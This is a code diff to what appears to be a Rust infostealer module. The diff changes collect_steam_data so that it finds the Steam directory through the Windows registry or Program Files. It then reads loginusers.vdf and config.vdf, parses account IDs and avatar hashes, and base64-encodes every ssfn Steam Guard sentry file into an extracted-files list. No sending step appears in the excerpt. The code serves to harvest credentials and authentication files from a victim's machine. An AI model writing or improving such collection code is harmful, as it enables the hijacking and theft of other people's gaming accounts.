@@ -423,37 +423,92 @@ pub fn collect_steam_data() -> SteamData {
     let mut accounts = Vec::new();
     let mut files = Vec::new();
 
-    let paths = [
-        env::var("PROGRAMFILES(X86)").ok(),
-        env::var("PROGRAMFILES").ok(),
-    ];
+    let mut steam_dir = PathBuf::new();
 
-    for base in paths.iter().flatten() {
-        let steam_dir = PathBuf::from(base).join("Steam");
-        let login_file = steam_dir.join("config").join("loginusers.vdf");
-        let registry_file = steam_dir.join("config").join("registry.vdf");
+    // Try to get steam path from registry
+    if let Ok(hkcu) = RegKey::predef(HKEY_CURRENT_USER).open_subkey("Software\\Valve\\Steam") {
+        if let Ok(path) = hkcu.get_value::<String, _>("SteamPath") {
+            steam_dir = PathBuf::from(path);
+        }
+    }
 
-        if login_file.exists() {
-            if let Ok(content) = fs::read_to_string(&login_file) {
-                files.push(ExtractedFile {
-                    path: login_file.to_string_lossy().to_string(),
-                    contents: content.clone(),
-                });
-                parse_steam_logins(&content, &mut accounts);
+    if steam_dir.as_os_str().is_empty() {
+        let paths = [
+            env::var("PROGRAMFILES(X86)").ok(),
+            env::var("PROGRAMFILES").ok(),
+        ];
+        for base in paths.iter().flatten() {
+            let p = PathBuf::from(base).join("Steam");
+            if p.exists() {
+                steam_dir = p;
+                break;
             }
         }
+    }
 
-        if registry_file.exists() {
-            if let Ok(content) = fs::read_to_string(&registry_file) {
-                files.push(ExtractedFile {
-                    path: registry_file.to_string_lossy().to_string(),
-                    contents: content,
-                });
+    if !steam_dir.exists() {
+        return SteamData { accounts, files };
+    }
+
+    let login_file = steam_dir.join("config").join("loginusers.vdf");
+    let config_file = steam_dir.join("config").join("config.vdf");
+
+    if login_file.exists() {
+        if let Ok(content) = fs::read_to_string(&login_file) {
+            files.push(ExtractedFile {
+                path: login_file.to_string_lossy().to_string(),
+                contents: content.clone(),
+            });
+            parse_steam_logins(&content, &mut accounts);
+        }
+    }
+
+    if config_file.exists() {
+        if let Ok(content) = fs::read_to_string(&config_file) {
+            files.push(ExtractedFile {
+                path: config_file.to_string_lossy().to_string(),
+                contents: content.clone(),
+            });
+
+            // Try to extract avatar hashes from config.vdf
+            extract_avatar_hashes(&content, &mut accounts);
+        }
+    }
+
+    // Collect ssfn files
+    if let Ok(entries) = fs::read_dir(&steam_dir) {
+        for entry in entries.flatten() {
+            let path = entry.path();
+            if let Some(file_name) = path.file_name().and_then(|n| n.to_str()) {
+                if file_name.starts_with("ssfn") {
+                    if let Ok(data) = fs::read(&path) {
+                        use base64::{Engine as _, engine::general_purpose};
+                        files.push(ExtractedFile {
+                            path: path.to_string_lossy().to_string(),
+                            contents: general_purpose::STANDARD.encode(data),
+                        });
+                    }
+                }
             }
         }
     }
 
     SteamData { accounts, files }
+}
+
+fn extract_avatar_hashes(content: &str, accounts: &mut Vec<SteamAccountEntry>) {
+    // This is a bit complex as VDF is nested, but we'll use a simple regex approach for AvatarHash
+    // The structure is usually "UserLocalConfigStore" -> "SteamID" -> "avatar" -> "hash"
+    let avatar_re = Regex::new(r#""(?P<id>\d+)"\s*\{[^}]*?"avatar"\s*"(?P<hash>[a-f0-9]+)""#).unwrap();
+
+    for cap in avatar_re.captures_iter(content) {
+        let id = &cap["id"];
+        let hash = &cap["hash"];
+        if let Some(account) = accounts.iter_mut().find(|a| a.steam_id == id) {
+            // Steam avatar bucket URL: https://avatars.akamai.steamstatic.com/<hash>_full.jpg
+            account.avatar_url = format!("https://avatars.akamai.steamstatic.com/{}_full.jpg", hash);
+        }
+    }
 }
 
 fn parse_steam_logins(content: &str, accounts: &mut Vec<SteamAccountEntry>) {
@@ -473,6 +528,7 @@ fn parse_steam_logins(content: &str, accounts: &mut Vec<SteamAccountEntry>) {
                 persona_name: String::new(),
                 remember_password: String::new(),
                 last_logon: String::new(),
+                avatar_url: String::new(),
                 details: String::new(),
             });
             continue;
